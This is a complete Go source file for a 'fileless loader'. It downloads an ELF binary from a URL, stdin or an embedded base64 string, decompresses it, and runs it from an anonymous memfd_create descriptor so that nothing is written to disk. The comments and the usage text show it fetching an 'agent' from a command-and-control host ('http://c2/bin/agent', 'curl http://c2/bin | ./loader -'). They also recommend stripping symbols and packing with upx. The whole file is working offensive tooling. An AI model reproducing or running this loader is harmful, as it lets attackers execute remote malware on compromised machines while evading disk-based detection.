// 6319 Fileless Loader
// Execute ELF binaries from memory using memfd_create
//
// Build: CGO_ENABLED=0 go build -ldflags="-s -w" -o loader loader.go
// Size: ~1.5MB (can compress with upx to ~500KB)
//
// Usage:
//   ./loader http://c2/bin/agent
//   curl http://c2/bin/agent | ./loader -
//   ./loader /path/to/binary

package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const (
	MFD_CLOEXEC       = 0x0001
	MFD_ALLOW_SEALING = 0x0002
	SYS_MEMFD_CREATE  = 319 // x86_64
)

func memfdCreate(name string, flags uint) (int, error) {
	namePtr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return -1, err
	}

	fd, _, errno := syscall.Syscall(
		SYS_MEMFD_CREATE,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(flags),
		0,
	)

	if errno != 0 {
		return -1, errno
	}

	return int(fd), nil
}

func loadFromURL(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

func loadFromFile(path string) ([]byte, error) {
	return os.ReadFile(path)
}

func loadFromStdin() ([]byte, error) {
	return io.ReadAll(os.Stdin)
}

func executeFileless(binary []byte, argv []string, env []string) error {
	if len(binary) < 4 || string(binary[:4]) != "\x7fELF" {
		return fmt.Errorf("not a valid ELF binary")
	}

	fd, err := memfdCreate("", MFD_CLOEXEC)
	if err != nil {
		return fmt.Errorf("memfd_create failed: %v", err)
	}

	file := os.NewFile(uintptr(fd), "")
	defer file.Close()

	_, err = file.Write(binary)
	if err != nil {
		return fmt.Errorf("write failed: %v", err)
	}

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	if len(argv) == 0 {
		argv = []string{"a.out"}
	}

	if len(env) == 0 {
		env = os.Environ()
	}

	return syscall.Exec(fdPath, argv, env)
}

func decompress(data []byte) ([]byte, error) {
	reader, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return data, nil
	}
	defer reader.Close()

	return io.ReadAll(reader)
}

func decodeEmbedded(encoded string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}

	return decompress(data)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Usage: %s <binary|url|->\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "       curl http://c2/bin | %s -\n", os.Args[0])
		os.Exit(1)
	}

	source := os.Args[1]
	var binary []byte
	var err error

	switch {
	case source == "-":
		binary, err = loadFromStdin()
	case strings.HasPrefix(source, "http://") || strings.HasPrefix(source, "https://"):
		binary, err = loadFromURL(source)
	case strings.HasPrefix(source, "data:"):
		binary, err = decodeEmbedded(strings.TrimPrefix(source, "data:"))
	default:
		binary, err = loadFromFile(source)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to load binary: %v\n", err)
		os.Exit(1)
	}

	binary, _ = decompress(binary)

	argv := os.Args[1:]
	if len(argv) == 0 {
		argv = []string{source}
	}

	err = executeFileless(binary, argv, nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Execution failed: %v\n", err)
		os.Exit(1)
	}
}
